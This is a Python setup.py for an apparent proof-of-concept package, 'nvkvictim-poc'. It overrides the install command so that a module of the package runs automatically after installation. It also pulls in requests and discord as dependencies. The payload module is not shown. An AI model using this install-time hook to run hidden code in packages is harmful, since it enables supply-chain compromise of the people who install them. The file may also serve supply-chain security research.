from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess

# Create a custom install class to run code after installation
class CustomInstall(install):
    def run(self):
        install.run(self)  # Call the original install command
        # Execute your code here
        subprocess.run(["python", "-m", "nvkvictim-poc.my_module"])

setup(
    name="nvkvictim-poc",
    version="1.0.1",
    author="nvk",
    author_email="nvkvictim@gmail.com",
    description="poc-poc",
    long_description="",
    long_description_content_type="text/markdown",
    url="",
    packages=find_packages(),
    install_requires=['requests', 'discord'],
    cmdclass={'install': CustomInstall},  # Use the custom install class
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
)

